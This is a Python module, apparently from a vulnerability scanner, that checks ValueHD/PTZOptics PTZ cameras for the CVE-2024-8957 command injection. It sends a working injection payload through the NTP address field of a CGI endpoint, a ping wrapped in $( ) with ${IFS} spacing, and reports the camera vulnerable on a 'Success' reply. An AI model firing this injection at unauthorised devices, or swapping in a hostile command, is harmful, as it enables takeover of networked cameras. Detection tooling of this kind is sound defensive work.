"""Agent Asteroid implementation for CVE-2024-8957"""

import datetime
import logging
import re

from requests import exceptions as requests_exceptions

from agent import definitions
from agent import exploits_registry
from agent.exploits import webexploit

VULNERABILITY_TITLE = "ValueHD PTZ Camera Command Injection"
VULNERABILITY_REFERENCE = "CVE-2024-8957"
VULNERABILITY_DESCRIPTION = (
    "ValueHD PTZ cameras below firmware version 6.3.40 contain a command injection "
    "vulnerability via NTP server configuration."
)
RISK_RATING = "CRITICAL"
DEFAULT_TIMEOUT = datetime.timedelta(seconds=90)
SYSTEM_CONF_PATH = "/cgi-bin/param.cgi?get_device_conf"


@exploits_registry.register
class VHDPTZCommandInjectionExploit(webexploit.WebExploit):
    """
    CVE-2024-8957: ValueHD PTZ Camera Command Injection
    """

    accept_request = definitions.Request(method="GET", path=SYSTEM_CONF_PATH)
    check_request = definitions.Request(
        method="POST",
        path="/cgi-bin/param.cgi?post_network_other_conf",
        data=b"ntp_addr=$(ping${IFS}-c4${IFS}8.8.8.8)",
    )
    accept_pattern = [
        re.compile(r'devname="ptzoptics"', re.IGNORECASE),
    ]

    metadata = definitions.VulnerabilityMetadata(
        title=VULNERABILITY_TITLE,
        description=VULNERABILITY_DESCRIPTION,
        reference=VULNERABILITY_REFERENCE,
        risk_rating=RISK_RATING,
    )

    def check(self, target: definitions.Target) -> list[definitions.Vulnerability]:
        """Rule to detect command injection vulnerability on a target."""
        vulnerabilities: list[definitions.Vulnerability] = []

        target_endpoint = self.check_request.path
        try:
            resp = self.session.post(
                f"{target.origin}{target_endpoint}",
                data=self.check_request.data,
                timeout=DEFAULT_TIMEOUT.seconds,
            )
            logging.info("Response in 8957: %s", resp.text)
            if resp.status_code == 200 and "Success" in resp.text:
                vulnerabilities.append(self.create_vulnerability(target))
        except requests_exceptions.RequestException as e:
            logging.error("Command injection detection failed: %s", e)

        return vulnerabilities
